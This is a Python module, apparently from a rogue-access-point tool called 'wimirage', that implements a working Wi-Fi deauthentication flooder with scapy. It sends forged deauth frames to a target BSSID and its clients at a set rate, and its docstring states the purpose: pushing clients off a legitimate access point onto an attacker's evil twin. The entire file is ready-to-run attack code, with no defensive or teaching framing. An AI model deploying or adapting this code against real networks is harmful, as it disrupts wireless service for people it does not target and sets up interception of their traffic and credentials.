"""802.11 Deauthentication attack module.

Implements ``DeauthAttack``, which crafts and broadcasts Dot11Deauth frames
against a target BSSID (and optionally a specific client) at a configurable
packets-per-second (PPS) rate. Used to force clients off the legitimate AP
so they roam onto our rogue twin.
"""

import logging
import subprocess
import threading
import time
from typing import TYPE_CHECKING

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp

if TYPE_CHECKING:
    from scapy.packet import Packet

logger = logging.getLogger("wimirage")

__all__ = ["DeauthAttack"]


class DeauthAttack:
    """Background-threaded Deauth flooder.

    Args:
        interface: Wireless interface in monitor mode.
        target_bssid: BSSID (AP MAC) to deauthenticate.
        target_channel: Channel the target AP operates on.
        client_mac: Specific client to target, or broadcast MAC for all.
        pps: Packets-per-second rate (positive integer).

    Attributes:
        packets_sent: Running counter of emitted frames.
    """

    DEFAULT_PPS = 100
    BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"

    def __init__(
        self,
        interface: str,
        target_bssid: str,
        target_channel: int,
        client_mac: str = "FF:FF:FF:FF:FF:FF",
        pps: int = DEFAULT_PPS,
    ) -> None:
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.client_mac = client_mac
        self.pps = pps
        self._running = False
        self._thread: threading.Thread | None = None
        self.packets_sent = 0
        self._packet: Packet | None = None
        self._reverse_packet: Packet | None = None

    def _build_deauth_packet(self) -> "Packet":
        dot11 = Dot11(addr1=self.client_mac, addr2=self.target_bssid, addr3=self.target_bssid)
        deauth = Dot11Deauth(reason=7)
        return RadioTap() / dot11 / deauth

    def _build_packets(self) -> None:
        self._packet = self._build_deauth_packet()

        if self.client_mac == self.BROADCAST_MAC:
            self._reverse_packet = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=self.client_mac, addr3=self.target_bssid)
                / Dot11Deauth(reason=7)
            )

    def set_channel(self) -> None:
        try:
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.target_channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5,
            )
        except subprocess.TimeoutExpired:
            logger.warning(f"Timeout setting channel on {self.interface}")
        except FileNotFoundError:
            logger.error("iwconfig not found")
        except Exception as e:
            logger.error(f"Failed to set channel: {e}")

    def _send_deauth(self) -> None:
        """Hot loop: emit one deauth (and reverse) frame per PPS tick.

        Assumes ``start()`` populated ``self._packet`` (and ``_reverse_packet``
        for broadcast targets) before launching this thread. Uses
        ``perf_counter`` to avoid drift when PPS is high.
        """
        assert self._packet is not None, "_packet must be built before _send_deauth runs"
        packet = self._packet
        reverse_packet = self._reverse_packet  # possibly None for targeted mode

        loop_start = time.perf_counter()
        sent = 0
        while self._running:
            target_time = loop_start + (sent / self.pps)
            try:
                sendp(packet, iface=self.interface, verbose=False)
                self.packets_sent += 1
                if reverse_packet is not None:
                    sendp(reverse_packet, iface=self.interface, verbose=False)
                    self.packets_sent += 1
                sent += 1
                sleep_for = target_time - time.perf_counter()
                if sleep_for > 0:
                    time.sleep(sleep_for)
            except PermissionError:
                logger.error("Permission denied sending packets. Are you root?")
                self._running = False
            except OSError as e:
                logger.error(f"OS error sending deauth: {type(e).__name__}: {e}")
                time.sleep(0.5)
            except subprocess.SubprocessError as e:
                # Scapy Packet.send may raise Scapy_Exception which extends
                # SubprocessError; timeout / dispatch issues land here.
                logger.error(f"Subprocess sending deauth: {type(e).__name__}: {e}")
                time.sleep(0.1)

    def start(self) -> None:
        """Build packets, switch channel, and launch the send-thread.

        Returns:
            None. Side effect: ``self._running`` becomes True and ``self._thread``
            references the daemon worker.
        """
        if self._running:
            logger.warning("Deauth attack already running.")
            return

        self._running = True
        self.packets_sent = 0
        self._build_packets()
        assert self._packet is not None, "_build_packets failed to populate _packet"
        self.set_channel()

        target_type = (
            "broadcast" if self.client_mac == self.BROADCAST_MAC else f"client {self.client_mac}"
        )
        logger.info(
            f"Starting deauth attack on {self.target_bssid} -> {target_type} at {self.pps} PPS"
        )

        self._thread = threading.Thread(target=self._send_deauth, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Signal the worker to stop and join it with a 3 second timeout."""
        if not self._running:
            return
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        logger.info(f"Deauth attack stopped. {self.packets_sent} packets sent.")

    def is_running(self) -> bool:
        """Return True if a worker thread is currently emitting frames."""
        return self._running

    def set_target(self, bssid: str, channel: int, client_mac: str | None = None) -> None:
        self.target_bssid = bssid
        self.target_channel = channel
        if client_mac:
            self.client_mac = client_mac
        if self._running:
            self._build_packets()
            self.set_channel()

    def set_pps(self, pps: int) -> None:
        if pps <= 0:
            raise ValueError("PPS must be positive")
        self.pps = pps
